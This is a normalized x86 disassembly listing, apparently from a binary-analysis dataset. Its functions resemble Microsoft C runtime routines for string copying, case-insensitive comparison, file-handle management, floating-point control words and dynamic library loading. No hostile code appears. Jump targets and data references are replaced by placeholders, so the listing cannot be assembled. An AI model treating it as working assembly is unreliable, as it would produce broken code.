jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_4350d0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_4351b0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov al 0xff
mov edi edi
[ rw-data ]
push 0x13
call sub_430d2a
mov [ esp ] 0x1
push 0x0
jmp r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
mov ebx eax
pop eax
or eax eax
jne r-xdata
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
mov eax 0xff
xor ebx ebx
nop
pop ebx
pop esi
pop edi
leave
retn
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
push 0x13
call sub_430d8b
add esp 0x4
[ rw-data ]
jmp r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_435744
mov ebx eax
add esp 0x4
call sub_435744
add esp 0x4
cmp bl al
je r-xdata
sbb al al
sbb al 0xff
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
sub_4352e7
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_4301d9
mov [ eax ] 0x9
call sub_4301e2
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_435e4e
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_43534c
push esi
mov edi eax
call sub_435ead
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_43534c
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_435e0c
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_4301d9
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx esi
and esi 0x1f
sar ecx 0x5
mov eax esi
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
and [ ecx + eax * 4 + 0x4 ] 0xfd
lea eax [ ecx + eax * 4 + 0x4 ]
mov eax edi
push eax
call sub_430166
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_4353bf
inc [ rw-data ]
push 0x1000
call sub_42dd9c
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_435403
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 4 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_43542c
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_435485
pop ecx
mov [ ebp + 0xc ] eax
test ebx ebx
pop ecx
je r-xdata
push esi
call edi
push 0x13
call sub_430d2a
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_430d8b
pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_435485
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
call sub_4301d9
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_4354ee
push ebx
push edi
push 0x2
xor ebx ebx
call sub_430d2a
pop ecx
push 0x3
pop edi
cmp [ rw-data ] edi
jle r-xdata
push 0x2
call sub_430d8b
pop ecx
mov eax ebx
pop edi
pop ebx
retn
push esi
inc edi
cmp edi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov eax [ rw-data ]
mov esi edi
shl esi 0x2
mov eax [ esi + eax ]
test eax eax
je r-xdata
pop esi
cmp edi 0x14
jl r-xdata
push eax
call sub_42da1b
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_42ded6
mov eax [ rw-data ]
pop ecx
and [ esi + eax ] 0x0
inc ebx
sub_43556f
push ebp
mov ebp esp
push ecx
push esi
fwait
fnstcw [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_4355ba
mov esi eax
mov eax [ ebp + 0xc ]
not eax
and esi eax
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
or esi eax
push esi
call sub_43564c
pop ecx
mov [ ebp + 0xc ] eax
pop ecx
fldcw [ ebp + 0xc ]
mov eax esi
pop esi
leave
retn
sub_4355ba
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push ebp
test bl 0x1
push edi
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop eax
test bl 0x8
je r-xdata
or al 0x8
test bl 0x10
je r-xdata
or al 0x4
test bl 0x20
je r-xdata
or al 0x2
test bl 0x2
je r-xdata
or al 0x1
movzx ecx bx
push esi
mov edx ecx
mov esi 0xc00
mov edi 0x300
and edx esi
mov ebp 0x200
je r-xdata
or eax 0x80000
and ecx edi
pop esi
je r-xdata
cmp edx 0x400
je r-xdata
or eax 0x20000
cmp ecx ebp
jne r-xdata
or ah 0x1
cmp edx 0x800
je r-xdata
retn
or eax 0x40000
pop edi
pop ebp
test bh 0x10
pop ebx
je r-xdata
or eax 0x10000
jmp r-xdata
or eax ebp
jmp r-xdata
cmp edx esi
jne r-xdata
or eax edi
jmp r-xdata
sub_43564c
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push esi
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
push 0x1
pop eax
test bl 0x4
je r-xdata
or al 0x4
test bl 0x2
je r-xdata
or al 0x8
test bl 0x1
je r-xdata
or al 0x10
test ebx 0x80000
je r-xdata
or al 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
mov esi 0x200
je r-xdata
or al 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or ah 0x4
cmp ecx esi
je r-xdata
retn
or ah 0x10
pop esi
test ebx 0x40000
pop ebx
je r-xdata
or eax esi
jmp r-xdata
or ah 0x8
jmp r-xdata
cmp ecx edx
jne r-xdata
or ah 0xc
jmp r-xdata
sub_4356d5
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] ebx
mov edi [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x41
jl r-xdata
push [ esp + 0x10 ]
call sub_435744
test ebx ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
push esi
call edi
push 0x13
call sub_430d2a
pop ecx
push 0x1
pop ebx
pop ebx
retn
cmp eax 0x5a
jg r-xdata
push esi
call edi
push 0x13
call sub_430d8b
pop ecx
jmp r-xdata
add eax 0x20
pop ebx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
sub_435744
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_430f15
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_43452a
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_43580f
mov eax [ esp + 0x8 ]
push esi
push 0x20
cdq
pop ecx
idiv ecx
push 0x1f
mov esi eax
mov eax [ esp + 0x10 ]
cdq
idiv ecx
pop ecx
mov eax [ esp + 0x8 ]
sub ecx edx
or edx 0xffffffff
shl edx cl
not edx
test [ eax + esi * 4 ] edx
jne r-xdata
xor eax eax
pop esi
retn
inc esi
cmp esi 0x3
jge r-xdata
push 0x1
pop eax
pop esi
retn
lea eax [ eax + esi * 4 ]
inc esi
add eax 0x4
cmp esi 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
sub_435858
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
push 0x20
mov ebx [ esp + 0x14 ]
cdq
pop ecx
idiv ecx
mov esi eax
mov eax [ esp + 0x14 ]
cdq
idiv ecx
lea edi [ ebx + esi * 4 ]
push edi
push 0x1f
pop ecx
push 0x1
pop eax
sub ecx edx
shl eax cl
push eax
push [ edi ]
call sub_43636a
add esp 0xc
dec esi
js r-xdata
pop edi
pop esi
pop ebx
retn
lea edi [ ebx + esi * 4 ]
push edi
push 0x1
push [ edi ]
call sub_43636a
add esp 0xc
dec esi
sub edi 0x4
test esi esi
jge r-xdata
test eax eax
je r-xdata
sub_4358ae
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
lea edi [ eax - 0x1 ]
push 0x20
pop ecx
and [ ebp - 0x4 ] 0x0
lea ebx [ edi + 0x1 ]
push 0x20
mov eax ebx
pop esi
cdq
idiv ecx
push 0x1f
mov ecx eax
mov eax ebx
cdq
idiv esi
mov eax [ ebp + 0x8 ]
pop esi
push 0x1
mov [ ebp - 0x8 ] ecx
lea eax [ eax + ecx * 4 ]
mov [ ebp + 0xc ] eax
sub esi edx
pop edx
mov ecx esi
shl edx cl
test [ eax ] edx
je r-xdata
or edx 0xffffffff
mov ecx esi
shl edx cl
push 0x3
pop ecx
and [ eax ] edx
mov eax [ ebp - 0x8 ]
inc eax
cmp eax ecx
jge r-xdata
inc ebx
push ebx
push [ ebp + 0x8 ]
call sub_43580f
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp + 0x8 ]
sub ecx eax
lea edi [ edx + eax * 4 ]
xor eax eax
[ edi ]
mov eax [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_435858
pop ecx
mov [ ebp - 0x4 ] eax
pop ecx
sub_43593a
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
push 0x3
sub ecx eax
pop edx
mov esi [ eax ]
mov [ ecx + eax ] esi
add eax 0x4
dec edx
jne r-xdata
pop esi
retn
sub_435961
mov eax [ esp + 0x4 ]
xor ecx ecx
xor eax eax
retn
inc ecx
add eax 0x4
cmp ecx 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_43597c
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x20
mov edi [ ebp + 0x8 ]
pop ebx
or esi 0xffffffff
cdq
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
idiv ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
cdq
idiv ecx
and [ ebp + 0xc ] 0x0
mov ecx edx
shl esi cl
sub ebx edx
not esi
mov eax [ edi ]
mov ecx eax
and ecx esi
mov [ ebp - 0x8 ] ecx
mov ecx edx
shr eax cl
or eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov ecx ebx
add edi 0x4
shl eax cl
dec [ ebp - 0x4 ]
mov [ ebp + 0xc ] eax
jne r-xdata
mov edi [ ebp - 0xc ]
push 0x2
pop ebx
mov esi edi
push 0x8
pop ecx
shl esi 0x2
mov eax [ ebp + 0x8 ]
and [ ecx + eax ] 0x0
mov edx [ ebp + 0x8 ]
mov eax ecx
sub eax esi
mov eax [ eax + edx ]
mov [ ecx + edx ] eax
jmp r-xdata
cmp ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
dec ebx
sub ecx 0x4
jns r-xdata
sub_435a09
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx ecx [ eax + 0xa ]
mov ebx ecx
and ecx 0x8000
mov [ ebp + 0x8 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
mov edi [ ebp + 0x10 ]
and ebx 0x7fff
sub ebx 0x3fff
mov [ ebp - 0x8 ] ecx
shl eax 0x10
cmp ebx 0xffffc001
mov [ ebp - 0x4 ] eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_43593a
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_4358ae
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
xor esi esi
push eax
call sub_435961
test eax eax
pop ecx
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx eax
sub ecx [ edi + 0x8 ]
cmp ebx ecx
jge r-xdata
inc ebx
xor eax eax
lea eax [ ebp - 0xc ]
push eax
call sub_435955
pop ecx
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_435955
pop ecx
jmp r-xdata
cmp edi 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ edi + 0xc ]
mov edi [ edi + 0x10 ]
shl esi cl
mov ecx [ ebp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or esi ecx
or esi [ ebp - 0xc ]
cmp edi 0x40
jne r-xdata
cmp ebx [ edi ]
jl r-xdata
sub eax ebx
mov esi eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_43593a
lea eax [ ebp - 0xc ]
push esi
push eax
call sub_43597c
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_4358ae
mov eax [ edi + 0xc ]
inc eax
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_43597c
add esp 0x20
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] esi
push [ edi + 0xc ]
mov esi [ edi + 0x14 ]
and [ ebp - 0x9 ] 0x7f
lea eax [ ebp - 0xc ]
push eax
add esi ebx
call sub_43597c
pop ecx
pop ecx
lea eax [ ebp - 0xc ]
push eax
call sub_435955
push [ edi + 0xc ]
or [ ebp - 0x9 ] 0x80
lea eax [ ebp - 0xc ]
push eax
call sub_43597c
mov esi [ edi + 0x14 ]
add esp 0xc
add esi [ edi ]
push 0x1
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
sub_435ba1
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_43650b
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_435b75
add esp 0x24
leave
retn
sub_435bce
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_43650b
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_435b8b
add esp 0x24
leave
retn
sub_435bfb
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ edx + 0xc ]
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
test ebx ebx
mov eax edi
jle r-xdata
and [ eax ] 0x0
test ebx ebx
jl r-xdata
mov [ ebp + 0x8 ] ebx
xor ebx ebx
cmp [ esi ] 0x31
jne r-xdata
cmp [ ecx ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc ecx
jmp r-xdata
push edi
call sub_42eea0
inc eax
push eax
push edi
push esi
call sub_42ea90
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
dec eax
cmp [ eax ] 0x39
jne r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov edx [ ebp + 0x10 ]
mov [ eax ] dl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc [ eax ]
mov [ eax ] 0x30
jmp r-xdata
sub_435c72
push ebp
mov ebp esp
sub esp 0x28
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_435cce
pop ecx
lea eax [ ebp - 0x28 ]
pop ecx
lea esi [ ebp - 0xc ]
push eax
push 0x0
push 0x11
sub esp 0xc
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_4369dc
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
movsx eax [ ebp - 0x26 ]
mov [ esi ] eax
movsx eax [ ebp - 0x28 ]
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_4350c0
add esp 0x20
mov [ esi + 0xc ] edi
mov eax esi
pop edi
pop esi
leave
retn
sub_435cce
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov ax [ edx + 0x6 ]
mov edi 0x7ff
mov ecx eax
and eax 0x8000
shr ecx 0x4
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
lea edi [ ecx + 0x3c01 ]
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
lea edi [ ecx + 0x3c00 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov [ eax + 0x8 ] cx
mov edx [ eax ]
add ecx ecx
mov ebx edx
shr ebx 0x1f
or ebx ecx
lea ecx [ edx + edx ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ebx
add edi 0xffff
mov ecx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] bx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
mov eax [ ebp + 0x8 ]
or ecx [ ebp - 0x4 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_435d8d
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_4301d9
mov [ eax ] 0x9
call sub_4301e2
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_435e0c
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
call sub_4301d9
mov [ eax ] 0x9
call sub_4301e2
and [ eax ] 0x0
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 4 + 0x4 ] 0x1
lea eax [ ecx + eax * 4 ]
je r-xdata
mov eax [ eax ]
retn
sub_435e4e
mov eax [ esp + 0x4 ]
push ebx
mov ecx eax
and eax 0x1f
sar ecx 0x5
push esi
push edi
mov esi [ ecx * 4 + rw-data ]
lea ebx [ ecx * 4 + rw-data ]
lea edi [ eax + eax * 8 ]
shl edi 0x2
add esi edi
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
pop edi
pop esi
pop ebx
retn
push 0x11
call sub_430d2a
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
push 0x11
call sub_430d8b
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
sub_435ecf
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx [ rw-data ]
push esi
push edi
jae r-xdata
call sub_4301d9
mov [ eax ] 0x9
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_435e4e
mov eax [ edi ]
pop ecx
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4301d9
mov [ eax ] 0x9
or esi 0xffffffff
push ebx
call sub_435e0c
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor esi esi
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push ebx
call sub_435ead
pop ecx
mov eax esi
jmp r-xdata
call sub_4301e2
mov [ eax ] esi
test esi esi
je r-xdata
sub_435f73
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_435fa4
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_436030
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_43612e
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ rw-data ]
push edi
je r-xdata
xor eax eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push ebx
call sub_42eea0
pop ecx
mov edi eax
call sub_436cae
test eax eax
jne r-xdata
push eax
call sub_42eea0
cmp eax edi
pop ecx
jbe r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
add esi 0x4
jmp r-xdata
